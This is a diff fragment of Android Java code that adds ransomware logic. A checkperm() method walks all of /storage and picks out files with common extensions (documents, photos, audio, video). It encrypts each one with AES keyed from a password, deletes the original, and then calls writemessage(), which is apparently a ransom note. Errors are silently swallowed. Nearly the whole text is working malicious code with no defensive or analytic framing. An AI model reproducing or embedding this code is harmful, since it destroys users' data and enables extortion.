@@ -1,0 +1,99 @@
+
+		// password, iv and salt should be transferred to the other end
+		// in a secure manner
+
+		// salt is used for encoding
+		// writing it to a file
+		// salt should be transferred to the recipient securely
+		// for decryption
+		byte[] salt = new byte[8];
+		SecureRandom secureRandom = new SecureRandom();
+		secureRandom.nextBytes(salt);
+		FileOutputStream saltOutFile = new FileOutputStream(path1+".enc.salt");
+		saltOutFile.write(salt);
+		saltOutFile.close();
+
+		SecretKeyFactory factory = SecretKeyFactory
+				.getInstance("PBKDF2WithHmacSHA1");
+		KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536,
+				256);
+		SecretKey secretKey = factory.generateSecret(keySpec);
+		SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
+
+		//
+		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); 
+		cipher.init(Cipher.ENCRYPT_MODE, secret);
+		AlgorithmParameters params = cipher.getParameters();
+
+		// iv adds randomness to the text and just makes the mechanism more
+		// secure
+		// used while initializing the cipher
+		// file to store the iv
+		FileOutputStream ivOutFile = new FileOutputStream(path1+".enc.iv");
+		byte[] iv = params.getParameterSpec(IvParameterSpec.class).getIV();
+		ivOutFile.write(iv);
+		ivOutFile.close();
+
+		//file encryption
+		byte[] input = new byte[64];
+		int bytesRead;
+
+		while ((bytesRead = inFile.read(input)) != -1) {
+			byte[] output = cipher.update(input, 0, bytesRead);
+			if (output != null)
+				outFile.write(output);
+		}
+
+		byte[] output = cipher.doFinal();
+		if (output != null)
+			outFile.write(output);
+
+		inFile.close();
+		outFile.flush();
+		outFile.close();
+              //  path1.delete();
+
+
+
+
+}
+//
+
+
+public void checkperm() {
+       if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED) {
+
+//
+
+String[] extensions = {"txt", "jpg", "bmp", "png", "pdf", "doc", "docx", "ppt", "pptx", "mp3", "mp4", "avi", "mpeg"};
+
+File dir1 = new File("/storage");
+List<File> files1 = (List<File>) FileUtils.listFiles(dir1,
+TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);
+		for (File file : files1) {
+try {
+          String path1 = file.getCanonicalPath();
+           
+          String extension = FilenameUtils.getExtension(path1);
+          if (ArrayUtils.contains(extensions, extension)) {
+
+          FileEncryption(path1);
+          file.delete();
+} //end if
+} catch (Exception e) {
+            }
+		}
+
+try {
+writemessage(); } catch (Exception e) {
+            }
+	
+
+
+       } else {
+            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
+            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, REQUEST_CODE_ASK_PERMISSIONS);
+          checkperm();
+        }
+}
+}
